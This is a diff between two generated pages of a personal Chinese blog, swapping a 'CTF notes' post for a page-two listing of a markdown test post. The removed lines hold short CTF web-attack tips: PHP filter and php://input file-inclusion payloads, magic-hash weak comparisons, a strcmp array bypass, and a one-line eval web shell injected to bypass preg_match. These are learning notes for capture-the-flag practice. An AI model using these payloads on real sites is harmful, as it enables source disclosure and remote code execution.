@@ -68,7 +68,7 @@
 
 
 
-  <meta name="keywords" content="note,CTF," />
+  <meta name="keywords" content="Hexo, NexT" />
 
 
 
@@ -79,18 +79,13 @@
 
 
 
-<meta name="description" content="直接构造&amp;lt;不行，会用&amp;amp;lt替换\u003c       &amp;lt; \u003c       &amp;gt; 有时候域名会藏一点提示信息">
-<meta name="keywords" content="note,CTF">
-<meta property="og:type" content="article">
-<meta property="og:title" content="CTF笔记">
-<meta property="og:url" content="http://yoursite.com/2018/10/12/CTF笔记/index.html">
+<meta property="og:type" content="website">
+<meta property="og:title" content="SILLYCRANE">
+<meta property="og:url" content="http://yoursite.com/page/2/index.html">
 <meta property="og:site_name" content="SILLYCRANE">
-<meta property="og:description" content="直接构造&amp;lt;不行，会用&amp;amp;lt替换\u003c       &amp;lt; \u003c       &amp;gt; 有时候域名会藏一点提示信息">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:updated_time" content="2018-10-12T10:23:50.100Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="CTF笔记">
-<meta name="twitter:description" content="直接构造&amp;lt;不行，会用&amp;amp;lt替换\u003c       &amp;lt; \u003c       &amp;gt; 有时候域名会藏一点提示信息">
+<meta name="twitter:title" content="SILLYCRANE">
 
 
 
@@ -120,13 +115,13 @@
 
 
 
-  <link rel="canonical" href="http://yoursite.com/2018/10/12/CTF笔记/"/>
+  <link rel="canonical" href="http://yoursite.com/page/2/"/>
 
 
 
 
 
-  <title>CTF笔记 | SILLYCRANE</title>
+  <title>SILLYCRANE</title>
   
 
 
@@ -145,7 +140,8 @@
     
   
 
-  <div class="container sidebar-position-left page-post-detail">
+  <div class="container sidebar-position-left 
+  page-home">
     <div class="headband"></div>
 
     <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
@@ -248,9 +244,9 @@
         <div class="content-wrap">
           <div id="content" class="content">
             
-
-  <div id="posts" class="posts-expand">
+  <section id="posts" class="posts-expand">
     
+      
 
   
 
@@ -263,7 +259,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/10/12/CTF笔记/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/10/11/markdown-note/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="sillycrane">
@@ -280,7 +276,9 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">CTF笔记</h1>
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2018/10/11/markdown-note/" itemprop="url">markdown-note</a></h1>
         
 
         <div class="post-meta">
@@ -292,8 +290,8 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-10-12T18:12:29+08:00">
-                2018-10-12
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-10-11T21:28:37+08:00">
+                2018-10-11
               </time>
             
 
@@ -352,26 +350,16 @@
       
 
       
-        <h2 id="直接构造-lt-不行，会用-amp-lt替换"><a href="#直接构造-lt-不行，会用-amp-lt替换" class="headerlink" title="直接构造&lt;不行，会用&amp;lt替换"></a>直接构造&lt;不行，会用&amp;lt替换</h2><p>\u003c       &lt;</p>
-<p>\u003c       &gt;</p>
-<h2 id="有时候域名会藏一点提示信息"><a href="#有时候域名会藏一点提示信息" class="headerlink" title="有时候域名会藏一点提示信息"></a>有时候域名会藏一点提示信息</h2><a id="more"></a>
-<h2 id="php伪协议："><a href="#php伪协议：" class="headerlink" title="php伪协议："></a>php伪协议：</h2><ul>
-<li>仅php://input、 php://stdin、 php://memory 和 php://temp 需要开启allow_url_include</li>
-<li>在php版本&lt;=5.2中进行测试是可以使用%00截断的。</li>
-<li>读取页面源代码<br>/about.php?f=php://filter/convert.base64-encode/resource=index.php<br>以base64加密的形式读取页面源代码，然后在再对代码进行base64解密就可以得到源代码</li>
-<li>当php配置allow_url_include和allow_url_fopen都为On的时候，可以对文件进行远程包含<br>例如:about.php?f=<a href="http://web/1.php" target="_blank" rel="noopener">http://web/1.php</a></li>
-<li>当allow_url_include为On，而allow_url_fopen为Off的是否，不可以直接远程包含文件，但是可以使用php://input、 php://stdin、 php://memory 和 php://temp等伪协议<br>例如about.php?f=php://input  post传输数据&lt;?php phpinfo(); ?&gt;</li>
-</ul>
-<h2 id="弱比较"><a href="#弱比较" class="headerlink" title="弱比较"></a>弱比较</h2><blockquote>
-<p>QNKCDZO<br>0e830400451993494058024219903391<br>s155964671a<br>0e342768416822451524974117254469</p>
-</blockquote>
-<h2 id="科学计数法绕过长度限制"><a href="#科学计数法绕过长度限制" class="headerlink" title="科学计数法绕过长度限制"></a>科学计数法绕过长度限制</h2><p>1e9=100000000</p>
-<h2 id="绕过strcmp"><a href="#绕过strcmp" class="headerlink" title="绕过strcmp"></a>绕过strcmp</h2><blockquote>
-<p>形如strcmp($_GET[‘a’], $flag) == 0<br>通过传递数组的方式a[]=<br>在5.3的版本之后使用这个函数比较数组和字符串会返回0</p>
-</blockquote>
-<h2 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h2><p>输入框执行命令（按enter）</p>
-<h2 id="绕过preg-match"><a href="#绕过preg-match" class="headerlink" title="绕过preg_match"></a>绕过preg_match</h2><p>二维数组<code>user[info][]=&lt;?php @eval($_POST[‘a’]);?&gt;</code></p>
-
+        
+          <h1 id="sillysblog这个下面就没有横线呢"><a href="#sillysblog这个下面就没有横线呢" class="headerlink" title="sillysblog这个下面就没有横线呢"></a>sillysblog这个下面就没有横线呢</h1><h1 id="sillycrane这个呢，看来大于一个-效果和上面一样呢"><a href="#sillycrane这个呢，看来大于一个-效果和上面一样呢" class="headerlink" title="sillycrane这个呢，看来大于一个=效果和上面一样呢"></a>sillycrane这个呢，看来大于一个=效果和上面一样呢</h1>
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2018/10/11/markdown-note/#more" rel="contents">
+              阅读全文 &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
+        
       
     </div>
     
@@ -386,42 +374,14 @@
 
     <footer class="post-footer">
       
-        <div class="post-tags">
-          
-            <a href="/tags/note/" rel="tag"># note</a>
-          
-            <a href="/tags/CTF/" rel="tag"># CTF</a>
-          
-        </div>
+
+      
+
       
 
       
       
-      
-
-      
-        <div class="post-nav">
-          <div class="post-nav-next post-nav-item">
-            
-              <a href="/2018/10/12/socket学习/" rel="next" title="socket学习">
-                <i class="fa fa-chevron-left"></i> socket学习
-              </a>
-            
-          </div>
-
-          <span class="post-nav-divider"></span>
-
-          <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2018/10/13/docker学习笔记/" rel="prev" title="docker学习笔记">
-                docker学习笔记 <i class="fa fa-chevron-right"></i>
-              </a>
-            
-          </div>
-        </div>
-      
-
-      
+        <div class="post-eof"></div>
       
     </footer>
   </div>
@@ -431,11 +391,14 @@
   </article>
 
 
+    
+  </section>
 
-    <div class="post-spread">
-      
-    </div>
-  </div>
+  
+  <nav class="pagination">
+    <a class="extend prev" rel="prev" href="/"><i class="fa fa-angle-left"></i></a><a class="page-number" href="/">1</a><span class="page-number current">2</span>
+  </nav>
+
 
 
           </div>
@@ -443,10 +406,6 @@
 
 
           
-
-  
-
-
 
         </div>
         
@@ -467,17 +426,8 @@
       
 
       
-        <ul class="sidebar-nav motion-element">
-          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
-            文章目录
-          </li>
-          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
-            站点概览
-          </li>
-        </ul>
-      
 
-      <section class="site-overview-wrap sidebar-panel">
+      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
         <div class="site-overview">
           <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
             
@@ -541,22 +491,6 @@
         </div>
       </section>
 
-      
-      <!--noindex-->
-        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
-          <div class="post-toc">
-
-            
-              
-            
-
-            
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#直接构造-lt-不行，会用-amp-lt替换"><span class="nav-number">1.</span> <span class="nav-text">直接构造&lt;不行，会用&amp;lt替换</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#有时候域名会藏一点提示信息"><span class="nav-number">2.</span> <span class="nav-text">有时候域名会藏一点提示信息</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#php伪协议："><span class="nav-number">3.</span> <span class="nav-text">php伪协议：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#弱比较"><span class="nav-number">4.</span> <span class="nav-text">弱比较</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#科学计数法绕过长度限制"><span class="nav-number">5.</span> <span class="nav-text">科学计数法绕过长度限制</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#绕过strcmp"><span class="nav-number">6.</span> <span class="nav-text">绕过strcmp</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#命令执行"><span class="nav-number">7.</span> <span class="nav-text">命令执行</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#绕过preg-match"><span class="nav-number">8.</span> <span class="nav-text">绕过preg_match</span></a></li></ol></div>
-            
-
-          </div>
-        </section>
-      <!--/noindex-->
       
 
       
@@ -691,10 +625,6 @@
 
 
   
-  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
-<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
-
-
 
   
 
